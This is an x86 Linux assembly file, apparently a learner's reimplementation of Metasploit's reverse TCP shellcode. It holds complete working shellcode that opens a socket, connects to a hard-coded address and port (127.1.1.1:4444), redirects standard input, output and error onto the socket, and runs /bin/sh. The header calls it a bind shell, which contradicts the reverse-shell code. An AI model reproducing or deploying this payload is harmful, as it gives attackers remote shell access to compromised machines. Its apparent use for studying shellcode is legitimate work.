; +==-------------------------------------==+
; |         Linux x86 Bind Shell Demo       |
; +==-------------------------------------==+
; | Author:  sp1icer                        |
; | Purpose: Build my own working demo of   |
; |             the shell_reverse_tcp       |
; |             shellcode in Metasploit.    |
; +==-------------------------------------==+

global _start

section .text
_start:
	push BYTE 0x66
	pop eax
	xor ebx, ebx
	inc ebx	
	xor edi, edi
	push edi 
	push 0x1
	push 0x2
	mov ecx, esp
	int 0x80
	mov esi, eax
	push BYTE 0x66
	pop eax
	mov bl, 0x3
	push DWORD 0x0101017F
	push WORD 0x5c11
	push WORD 0x2
	mov ecx, esp
	push BYTE 0x10	
	push ecx
	push esi
	mov ecx, esp
	push BYTE 0x10
	pop edx	
	int 0x80
	push BYTE 0x3F
	pop eax
	push esi
	pop ebx
	xor ecx, ecx
	int 0x80
	mov al, 0x3F
	inc ecx
	int 0x80
	mov al, 0x3F
	inc ecx
	int 0x80
	push 0xB
	pop eax
	xor ebx, ebx
	push ebx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80
